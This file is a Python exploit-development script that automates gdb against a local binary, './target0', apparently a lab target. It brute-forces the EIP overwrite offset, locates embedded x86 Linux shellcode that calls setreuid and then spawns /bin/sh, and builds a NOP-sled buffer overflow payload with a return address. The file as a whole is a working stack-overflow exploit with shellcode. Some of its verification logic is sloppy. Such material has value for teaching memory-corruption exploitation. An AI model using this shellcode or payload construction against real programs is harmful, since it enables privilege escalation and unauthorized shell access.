import subprocess
import re
import time

# The shellcode we want to execute
shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

def gdb_run_command(gdb, command):
    print(f"[dbg] Running command: {command.decode('utf-8')}")
    gdb.stdin.write(command + b"\n")
    gdb.stdin.flush()

def gdb_read_output(gdb):
    output = b""
    while True:
        line = gdb.stdout.readline()
        if b"(gdb)" in line:
            break
        output += line
    print(f"[dbg] GDB output:\n{output.decode('utf-8')}")
    return output.decode('utf-8')

def check_gdb_running(gdb):
    gdb_run_command(gdb, b"show version")
    output = gdb_read_output(gdb)
    if "GNU gdb" in output:
        print("[+] GDB is running correctly.")
    else:
        print("[-] GDB is not running correctly. Please check your setup.")
        exit(1)

def find_eip_offset():
    print("[+] Finding offset to EIP...")
    for offset in range(1, 1000):
        print(f"[dbg] Trying offset: {offset}")
        gdb = subprocess.Popen(["gdb", "./target0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Check if GDB is running correctly
        check_gdb_running(gdb)

        # Create a cyclic pattern to identify the offset
        pattern = ("A" * offset).encode('utf-8') + b"BBBBCCCCDDDDEEEE"
        
        # Run the program with the pattern
        gdb_run_command(gdb, b"run " + pattern)
        time.sleep(0.1)  # Add a short delay to allow the program to run
        gdb_run_command(gdb, b"info registers eip")
        output = gdb_read_output(gdb)
        
        # Check if EIP is overwritten with "BBBB" (0x42424242)
        if "0x42424242" in output:
            print(f"[+] Found EIP offset: {offset}")
            
            # Double-check the offset by running again
            print("[dbg] Double-checking the offset...")
            gdb_run_command(gdb, b"run " + pattern)
            time.sleep(0.5)  # Add a short delay to allow the program to run
            gdb_run_command(gdb, b"info registers eip")
            output = gdb_read_output(gdb)
            
            if "0x42424242" in output:
                print("[+] Offset confirmed!")
                return offset
            else:
                print("[-] Offset confirmation failed. Continuing search...")
        
        gdb.stdin.close()
        gdb.wait()
    
    print("[-] Could not find EIP offset!")
    return None

def find_shellcode_address(eip_offset):
    print("[+] Finding shellcode address...")
    gdb = subprocess.Popen(["gdb", "./target0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Check if GDB is running correctly
    check_gdb_running(gdb)
    
    # Create a payload with NOP sled and shellcode
    payload = b"\x90" * (eip_offset - len(shellcode)) + shellcode + b"A" * 4
    
    # Run the program with the payload
    gdb_run_command(gdb, b"run " + payload)
    time.sleep(0.1)  # Add a short delay to allow the program to run
    gdb_run_command(gdb, b"x/40wx $esp")
    output = gdb_read_output(gdb)
    
    # Extract the shellcode address from the output
    match = re.search(r"(0x[\w]+)", output)
    if match:
        shellcode_address = int(match.group(1), 16)
        print(f"[+] Found shellcode address: {hex(shellcode_address)}")
        
        # Verify the shellcode is at the expected location
        print("[dbg] Verifying shellcode location...")
        gdb_run_command(gdb, b"x/16bx " + hex(shellcode_address).encode('utf-8'))
        output = gdb_read_output(gdb)
        
        if re.search(re.escape(shellcode), output.encode('utf-8')):
            print("[+] Shellcode location verified!")
            return shellcode_address
        else:
            print("[-] Shellcode not found at the expected address. Continuing search...")
    else:
        print("[-] Could not find shellcode address!")
        return None

def confirm_exploit(eip_offset, shellcode_address):
    print("[+] Confirming exploit...")
    gdb = subprocess.Popen(["gdb", "./target0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Check if GDB is running correctly
    check_gdb_running(gdb)
    
    # Create the final exploit payload
    exploit = b"\x90" * (eip_offset - len(shellcode)) + shellcode + shellcode_address.to_bytes(4, byteorder='little')
    
    # Set a breakpoint at the shellcode address
    gdb_run_command(gdb, b"break *" + hex(shellcode_address).encode('utf-8'))
    
    # Run the program with the exploit
    gdb_run_command(gdb, b"run " + exploit)
    time.sleep(0.5)  # Add a short delay to allow the program to run
    output = gdb_read_output(gdb)
    
    # Check if we hit the breakpoint in our shellcode
    if "Breakpoint" in output:
        print("[+] Exploit successful! Shellcode reached.")
        
        # Verify the shellcode is being executed
        print("[dbg] Verifying shellcode execution...")
        gdb_run_command(gdb, b"stepi")
        output = gdb_read_output(gdb)
        
        if "execve" in output:
            print("[+] Shellcode execution confirmed!")
        else:
            print("[-] Shellcode execution not confirmed.")
    else:
        print("[-] Exploit failed. Shellcode not reached.")

# Main execution flow
print("[+] Starting exploit development process...")

eip_offset = find_eip_offset()
if eip_offset:
    print(f"[+] EIP offset found: {eip_offset}")
    shellcode_address = find_shellcode_address(eip_offset)
    if shellcode_address:
        print(f"[+] Shellcode address found: {hex(shellcode_address)}")
        confirm_exploit(eip_offset, shellcode_address)
    else:
        print("[-] Failed to find shellcode address. Exploit development aborted.")
else:
    print("[-] Failed to find EIP offset. Exploit development aborted.")

print("[+] Exploit development process completed.")